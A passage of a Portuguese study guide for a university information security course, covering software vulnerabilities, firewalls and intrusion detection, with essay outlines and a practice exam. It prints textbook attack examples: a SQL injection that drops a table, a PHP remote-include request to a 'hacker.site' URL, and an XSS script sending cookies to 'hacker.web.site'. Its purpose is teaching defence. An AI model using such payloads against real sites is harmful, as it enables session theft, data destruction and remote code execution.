falha; o tratamento de erros acrescenta código e tempo, conflitando com prazos curtos e
vantagem de mercado; a menos que a segurança seja um objetivo de projeto desde o início, um
programa seguro é improvável. Manutenção: verificar suposições, erros e interações com o
código existente, ou um programa seguro vira vulnerável. Mentalidade: não "a maioria dos
usuários, na maior parte do tempo"; paranoia é uma virtude; testes normais perdem entradas
incomuns; resiliência a qualquer condição inesperada. Maturidade: a sociedade tolera falha
de software muito mais que pontes que desabam; as normas ISO 12207 e SEI06 nomeiam a
segurança como objetivo de projeto; o SAFECode publica melhores práticas; a modelagem de
ameaças pertence ao projeto.

**V5.** Tratamento da entrada, implementação do algoritmo, interação com outros componentes,
saída. Entrada: qualquer dado de fora do programa cujo valor o programador não conhece ao
codificar; fontes óbvias teclado, mouse, arquivos, rede; fontes indiretas ambiente, arquivos
de configuração, valores do SO. Preocupações: tamanho, e significado ou interpretação.

**V6.** Suposição de um tamanho máximo, buffers fixos de 512 ou 1024 bytes, nenhuma
verificação de que a entrada cabe; o estouro compromete a execução; os testes usam entradas
esperadas e raramente entradas grandes o bastante; rotinas de biblioteca podem não limitar
cópias. Correções: rotinas seguras de cópia, tratar toda entrada como perigosa, buffers
dinâmicos ou processamento em blocos do tamanho do buffer, verificar a memória pedida contra
a disponível, falhar de forma graciosa (blocos, descartar o excesso, terminar), verificar em
todo ponto de entrada de dados desconhecidos.

**V7.** `var_outrasInfos[10]` e `var_nome[10]` ficam na pilha; `my_gets` copia caracteres até
a quebra de linha sem verificar o comprimento; mais de 10 caracteres estouram sobre
`var_nome`, então "Gabriel" é sobrescrito pelo excesso. Uma entrada longa então dispara
`*** stack smashing detected ***: terminated` e SIGABRT: uma proteção do GCC detectou a pilha
corrompida no retorno da função. Reproduza o ataque clássico com
`gcc -fno-stack-protector`, depois leia `man 7 signal`.

**V8.** Dados binários são supostos inteiros, floats, strings ou estruturas, e a suposição
precisa ser validada conforme os valores são lidos (Ethernet, IP, TCP; DNS, SNMP, NFS contra
sua sintaxe abstrata). Heartbleed, OpenSSL 2014: nenhuma verificação do comprimento pedido
contra os dados fornecidos, uma leitura excessiva de buffer, vazou nomes de usuário, senhas e
chaves privadas. Texto: bytes viram caracteres por um conjunto de caracteres (ASCII,
extensões do Windows e do macOS, internacionalização); identificar o conjunto, depois o
significado (inteiro, nome de arquivo, URL, e-mail) e confirmar o tipo, ou o atacante
influencia o programa.

**V9.** Uma classe ampla de falhas por tratamento inválido de entrada em que a entrada
influencia o fluxo de execução; mecanismo comum: entrada passada como parâmetro a um
programa auxiliar cuja saída é usada; frequente em linguagens de script (Perl, PHP, Python,
sh) e em scripts CGI web que processam formulários HTML. Injeção de SQL: `$query = "SELECT *
FROM suppliers WHERE name = '" . $name . "';"`; a entrada `Bob` funciona, a entrada
`Bob'; drop table suppliers` retorna o registro e apaga a tabela; metacaracteres SQL.
Prevenção: validar (escapar ou rejeitar), funções de sanitização, placeholders ou parâmetros
SQL em vez de concatenação, stored procedures.

**V10.** `include $path . 'functions.php'`: o script é chamado diretamente; o PHP atribuía
variáveis globais a partir da requisição HTTP e `include` aceitava URLs remotas; `GET
/calendar/embed/day.php?path=http://hacker.site/hack.txt?&cmd=ls` faz de `$path` a URL do
atacante e roda código remoto com os privilégios do servidor web. Defesas: bloquear a
atribuição automática de campos de formulário a globais (array, buscar por nome; pode quebrar
código legado); só constantes em include e require, ou validar logo antes do uso; identificar
todas as entradas, validar suposições, entender como cada função interpreta seus argumentos.
Variantes: injeção de e-mail, string de formato, injeção de interpretador. Desserialização:
um fluxo de bytes reconstruído em um objeto; aceitar objetos serializados de fontes não
confiáveis deixa um fluxo manipulado rodar a lógica do atacante durante a reconstrução,
muitas vezes RCE.

**V11.** Um comentário de livro de visitas com `<script>document.location='http://hacker.web.site/
cookie.cgi?'+document.cookie</script>` envia o cookie do próximo visitante ao atacante, que o
personifica. Ofuscação com entidades HTML (`&#60;&#115;...`), interpretadas de forma idêntica
pelo navegador. Prevenção: examinar a entrada, remover ou escapar código perigoso, os
validadores traduzem as entidades antes de verificar; sanitizar a saída. Uma falha de
tratamento tanto da entrada quanto da saída; o alvo é o próximo usuário, não o servidor;
relacionada a CSRF e HTTP response splitting.

**V12.** A lista branca compara com o que se quer e aceita só o válido: recomendada. A lista
negra compara com valores perigosos conhecidos e falha a cada nova evasão. Normalmente
expressões regulares; em caso de falha rejeitar ou sanitizar. Canonicalização: caracteres
têm várias codificações (HTML, UTF-8); "/" tem formas além de 2F; codificações longas
contornaram filtros (IIS, anos 1990); reduzir a entrada a uma forma padrão única e mínima
antes da validação; usar bibliotecas anti-XSS ou frameworks. Conversão de tipo: um tamanho
lido como sem sinal e comparado como com sinal; um valor com o bit mais alto ligado é lido
como negativo, passa na verificação de máximo, estoura na alocação ou cópia. Fuzzing: Barton
Miller 1989, entrada aleatória para encontrar travamentos; simples, barato, sem suposições,
encontra falhas exploráveis; pode perder bugs que exigem condições específicas; usado por
desenvolvedores e atacantes.

**V13.** O gerador aleatório previsível do Netscape quebrou sua criptografia; sequestro de
sessão TCP por números de sequência iniciais previsíveis; Ken Thompson 1984, um compilador
malicioso inserindo backdoors invisíveis; o Morris Worm usando o comando DEBUG do sendmail.
Memória: a tipagem fraca do C permite manipulação de ponteiros, estouros e estruturas
corrompidas; defesa: tipagem forte ou conversões validadas; vazamentos de memória não
liberada levam a esgotamento e DoS, gerência automática preferível. Concorrência: condições
de corrida corrompem valores compartilhados sem sincronização; mau uso de primitivas causa
impasse, que atacantes disparam para DoS; escolher primitivas corretamente, limitar as áreas
compartilhadas.

**V14.** O SO constrói o ambiente do processo (código, dados, argumentos, variáveis de
ambiente), tudo entrada externa a validar; permissões por usuário e grupo, acesso excessivo é
perigoso. Variáveis de ambiente herdadas do pai (PATH, IFS, LD_LIBRARY_PATH): o ataque ao
PATH roda um `grep` falso a partir de um script privilegiado; LD_LIBRARY_PATH carrega
bibliotecas maliciosas; mitigação: sem scripts de shell privilegiados, encapsuladores
compilados que limpam o ambiente, redefinir variáveis críticas no início. Menor privilégio:
privilégios mínimos; um programa root comprometido dá controle total; preferir privilégios
de grupo; servidores web não devem ser donos de todos os seus arquivos; usar root só para
vincular portas baixas e depois abandonar. Modularização: módulos pequenos, privilégio
elevado só onde necessário e brevemente (Postfix). A jaula chroot limita a visão do sistema
de arquivos a um diretório; difícil de configurar, escape ou falha se errada. Apagamento
seguro: sobrescrever um arquivo não o apaga por causa dos buffers de E/S, buffers do sistema
de arquivos e controladores inteligentes (SSDs evitam reescrever o mesmo bloco); forçar flush
e sync.

**V15.** A saída é binária ou textual e precisa corresponder estritamente ao formato esperado;
os usuários supõem que o programa confiável a gerou e validou, o que falha quando a entrada
de um usuário é mostrada a outro (comentários, fóruns) sem sanitização. Ataques: sequências
de escape VT100 reprogramavam teclas de função para rodar comandos quando o texto era visto;
XSS roda JavaScript de terceiros no navegador da vítima pela confiança do navegador no site.
Mitigação: o programa que retransmite é responsável, lista branca de conteúdo seguro;
especificar a codificação de caracteres explicitamente (Content-Type) para o navegador não
supor um padrão inseguro; o alvo é o usuário ou o dispositivo de exibição, não o servidor,
mas a reputação do software sofre.

## 8. Esqueletos de dissertativa

Toda resposta longa tem as mesmas quatro partes.

1. Qual problema o mecanismo resolve.
2. Como funciona, uma frase, com o número.
3. Como falha, ou o que não fornece.
4. A correção, ou o substituto moderno.

**E1. "Filtro de pacotes sem estado versus com estado."**

- **Problema:** deixar entrar as respostas a clientes internos sem abrir toda porta alta.
- **Como:** regras sem estado sobre cabeçalhos L3 e L4, Tabela 9.1 com 5 regras; a regra de
  resposta precisa permitir destino > 1023 na entrada; refinamentos com porta de origem 25 e
  o flag ACK.
- **Falha:** sem contexto, um atacante alcança a porta 8080 a partir da porta 5150, ou envia
  da porta de origem 25; sem carga útil, log limitado, falsificação, fragmentos minúsculos,
  erro de configuração.
- **Correção:** a tabela de estado das conexões de saída ativas, entrada para portas altas
  só com correspondência; rastreamento de números de sequência; DPI limitado para FTP, IM,
  SIPS. Para ataques de aplicação, um proxy de aplicação.

**E2. "Filtro positivo versus filtro negativo."**

- **Problema:** decidir a postura do firewall para tráfego que nenhuma regra menciona.
- **Como:** o filtro positivo permite o tráfego listado e termina com deny (descarte padrão,
  "não permitido é proibido"); o filtro negativo nega o tráfego listado e termina com allow
  (encaminhamento padrão, "não proibido é permitido").
- **Falha:** o positivo é visível aos usuários como obstáculo e precisa de uma regra por
  serviço; o negativo deixa aberto todo serviço esquecido e o administrador reage a cada nova
  ameaça; "outros: não" exige faixas de portas.
- **Correção:** filtro positivo para empresas e governo e para qualquer servidor com uma
  tabela de requisitos; negativo só em organizações abertas como universidades. As regras
  derivam da política, que deriva da avaliação de risco.

**E3. "Detecção por assinatura versus por anomalia."**

- **Problema:** decidir se o comportamento observado é uma intrusão, com a sobreposição
  entre comportamento de intruso e de usuário e a falácia da taxa-base.
- **Como:** assinaturas comparam dados com padrões maliciosos conhecidos (regra do Snort com
  um content de 6 bytes); anomalia constrói uma linha de base em uma fase de treinamento e
  marca desvios na fase de detecção (estatística, baseada em conhecimento, aprendizado de máquina).
- **Falha:** assinaturas perdem dia zero e exigem trabalho constante de assinaturas; anomalia
  produz mais falsos alarmes (taxa de ML inaceitável hoje), exige treinamento e boas
  métricas, e não separa internos (Anderson).
- **Correção:** usar as duas, em HIDS e NIDS, em um IDS distribuído, dentro da defesa em
  profundidade com criptografia, trilhas de auditoria, autenticação forte.

**E4. "HIDS versus NIDS, e o problema da criptografia."**

- **Problema:** cobrir tanto o perímetro da rede quanto a atividade dentro de hosts sensíveis.
- **Como:** o NIDS examina pacotes em pontos selecionados em L3, L4, L7, por sensores em linha
  ou passivos (derivação, NIC sem IP); o HIDS examina rastros de chamadas de sistema,
  registros de auditoria, somas de verificação de arquivos, Registro em um host.
- **Falha:** o NIDS é cego dentro de TLS/SSL e não vê nada que contorna a rede; o HIDS cobre
  um host, custa seus recursos, e intrusos editam seus logs; chamadas de sistema são
  problemáticas no Windows.
- **Correção:** IDS distribuído ou híbrido com um analisador central; HIDS nos pontos finais
  para dados decifrados; terminar a cifragem no firewall ou proxy e colocar o sensor depois;
  honeypots para desviar e observar.

**E5. "Estouro de buffer e programação defensiva."**

- **Problema:** entrada maior do que o programador supôs corrompe a memória e deixa o
  atacante escolher a falha.
- **Como:** um buffer fixo (512, 1024 ou os 10 bytes do exemplo) preenchido por uma rotina
  sem verificação de comprimento; o excesso sobrescreve variáveis adjacentes ou o endereço de
  retorno; o protetor de pilha do GCC aborta com "stack smashing detected", desabilitado por
  `-fno-stack-protector`.
- **Falha:** testes comuns usam entradas esperadas; rotinas de biblioteca não limitam cópias;
  a tipagem fraca do C permite; conversões de sem sinal para com sinal derrotam verificações
  de tamanho; Heartbleed é o lado da leitura.
- **Correção:** programação defensiva, não supor nada e verificar tudo; rotinas seguras de
  cópia, buffers dinâmicos, processamento em blocos, falha graciosa; validar toda fonte de
  entrada, lista branca, canonicalizar primeiro; fuzzing; linguagens fortemente tipadas;
  menor privilégio para que um comprometimento ganhe pouco.

## 9. Simulado (45 minutos, sem consulta)

Respostas nos baralhos da seção 7.

1. Enuncie os três objetivos de projeto do firewall de [BELL94] e como cada um é alcançado. (F2)
2. Defina um IDS e nomeie seus três componentes lógicos. (D4)
3. Por que o programa em C da aula sobrescreve "Gabriel"? O que o GCC imprime? (V7)
4. Filtro positivo versus negativo: qual regra é implícita no final de cada um? (F5)
5. A detecção por assinatura não detecta que tipo de ataque? Por quê? (D9, D10)
6. Defina programação defensiva e sua regra principal. (V3)
7. Explique a falha na regra 4 da Tabela 9.1 e a exploração na porta 8080. (F7)
8. Interpretação frouxa versus estrita: qual erro cresce em cada uma? (D6)
9. Injeção de SQL: mostre a entrada que apaga a tabela e nomeie duas defesas. (V9)
10. O que o firewall com estado acrescenta ao filtro de pacotes? O que é a tabela de estado? (F9)
11. Quatro fontes de dados de um HIDS, com uma desvantagem cada. (D11)
12. Lista branca versus lista negra: qual é recomendada e por quê? (V12)
13. Por que o flag ACK é necessário na regra 4 refinada, além da porta de origem 25? (F7)
14. Sensor em linha versus passivo: qual pode ser um IPS? (D14)
15. O que é canonicalização e por que precisa vir antes da validação? (V12)
16. Proxy de aplicação versus proxy de circuito: qual examina a carga útil? (F11, F12)
17. As três posições do honeypot: qual captura internos, qual não traz risco interno? (D16)
18. Heartbleed: ano, software, classe de falha, o que vazou. (V8)
19. Três propósitos do firewall interno em uma DMZ. (F15)
20. Escreva o cabeçalho da regra do Snort e explique `![7680,1521]`. (D17)
21. XSS: quem é o alvo real, e quais dois passos de tratamento falharam? (V11)
22. Onde o IPsec deve ficar: atrás do firewall, no roteador, ou no firewall? Por quê? (F16)
23. Explique a falácia da taxa-base para um IDS. (D6)
24. Ataques ao PATH e ao LD_LIBRARY_PATH, e duas mitigações. (V14)
25. Por que DROP é mais furtivo que REJECT contra uma varredura de portas? (F18)
26. Os seis passos da metodologia de ataque, um exemplo cada. (D3)
27. As cinco falhas de código do OWASP e as três categorias do CWE/SANS. (V1)
28. SOCKS: RFC, porta, os cinco passos TCP. (F12)

---

**Arquivos úteis no repositório:**

- `ICP473-Slides/slides-ICP473-Segurança-da-Informação.pdf` (619 páginas, a P3 começa no 448)
- `ICP473-Slides/slides-por-aula/aula14-firewalls.tex`, `aula15-idsips.tex`,
  `aula16-vulnSoftware.tex`
- `ICP473-Listas/lista8.pdf`, `lista9.pdf`

Compile e rode o programa de estouro de buffer dos slides 588 a 592 antes da prova, com e
sem `-fno-stack-protector`.
